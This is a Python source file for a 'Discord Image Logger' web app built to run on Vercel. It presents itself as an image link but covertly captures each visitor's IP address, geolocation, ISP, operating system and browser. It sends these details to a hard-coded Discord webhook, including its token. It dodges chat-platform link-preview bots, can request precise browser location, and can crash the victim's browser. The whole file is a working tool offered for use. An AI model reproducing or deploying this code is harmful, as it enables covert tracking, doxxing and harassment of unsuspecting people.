# api/index.py
# Discord Image Logger - Vercel Compatible
# By DeKrypt | Adapted for Vercel

from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__version__ = "v2.0"

config = {
    "webhook": "https://discord.com/api/webhooks/1507868979509858444/ijiGfDxt28i7dbuxPnJoDY5QbwpYZ7WVe1CIR_yM5AY23ryTWX6c-XJiNXv9CSv_3LjO",
    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }],
        }, timeout=10)
    except:
        pass


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }],
                }, timeout=10)
            except:
                pass
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown",
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "UTC/Unknown", "mobile": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
    except:
        os_name, browser = "Unknown", "Unknown"

    timezone_str = info.get("timezone", "UTC/Unknown")
    try:
        tz_parts = timezone_str.split('/')
        if len(tz_parts) > 1:
            tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
        else:
            tz_display = timezone_str
    except:
        tz_display = timezone_str

    coords_str = f"{info.get('lat', '?')}, {info.get('lon', '?')}"
    if coords:
        coords_str = coords.replace(',', ', ')
        maps_link = f'[Google Maps](https://www.google.com/maps/search/google+map++{coords})'

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{coords_str}` ({'Approximate' if not coords else f'Precise, {maps_link}'})
> **Timezone:** `{tz_display}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
""",
        }],
    }
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass
    return info


# ========== VERCEL WSGI HANDLER ==========

def app(environ, start_response):
    """Vercel WSGI handler"""
    try:
        # Parse environ
        method = environ.get("REQUEST_METHOD", "GET")
        path = environ.get("PATH_INFO", "/")
        query_string = environ.get("QUERY_STRING", "")
        remote_addr = environ.get("REMOTE_ADDR", "")
        
        # Build headers dict
        headers = {}
        for key, value in environ.items():
            if key.startswith("HTTP_"):
                header_name = key[5:].replace("_", "-").title()
                headers[header_name] = value
        
        # Get real IP from Vercel headers
        ip = headers.get("X-Forwarded-For", headers.get("X-Real-Ip", remote_addr))
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()
        
        useragent = headers.get("User-Agent", "")
        params = {}
        if query_string:
            params = dict(parse.parse_qsl(query_string))

        # Determine image URL
        if config.get("imageArgument"):
            b64param = params.get("url") or params.get("id")
            try:
                url = base64.b64decode(b64param.encode()).decode() if b64param else config["image"]
            except:
                url = config["image"]
        else:
            url = config["image"]

        # IP blacklist check
        if ip and ip.startswith(blacklistedIPs):
            start_response("403 Forbidden", [("Content-Type", "text/plain")])
            return [b"Forbidden"]

        # Bot check
        bot = botCheck(ip, useragent)
        if bot:
            makeReport(ip, useragent, endpoint=path, url=url)
            if config.get("buggedImage"):
                loading_bytes = base64.b85decode(
                    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
                )
                start_response("200 OK", [
                    ("Content-Type", "image/jpeg"),
                    ("Content-Length", str(len(loading_bytes)))
                ])
                return [loading_bytes]
            else:
                start_response("302 Found", [("Location", url)])
                return [b""]

        # Build HTML response
        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''

        if config.get("accurateLocation"):
            data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var sep = currenturl.includes("?") ? "&" : "?";
            location.replace(currenturl + sep + "g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
        });
    }
}
</script>"""

        if config.get("crashBrowser"):
            data += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}},100)</script>'

        if config.get("redirect", {}).get("redirect"):
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

        if config.get("message", {}).get("doMessage"):
            data = config["message"]["message"]

        # Check for geolocation data in params
        location = None
        if params.get("g") and config.get("accurateLocation"):
            try:
                location = base64.b64decode(params["g"].encode()).decode()
            except:
                pass

        # Report
        if location:
            makeReport(ip, useragent, location, path, url=url)
        else:
            makeReport(ip, useragent, endpoint=path, url=url)

        response_body = data.encode()
        start_response("200 OK", [
            ("Content-Type", "text/html; charset=utf-8"),
            ("Content-Length", str(len(response_body)))
        ])
        return [response_body]

    except Exception:
        reportError(traceback.format_exc())
        start_response("500 Internal Server Error", [("Content-Type", "text/plain")])
        return [b"500 - Internal Server Error"]
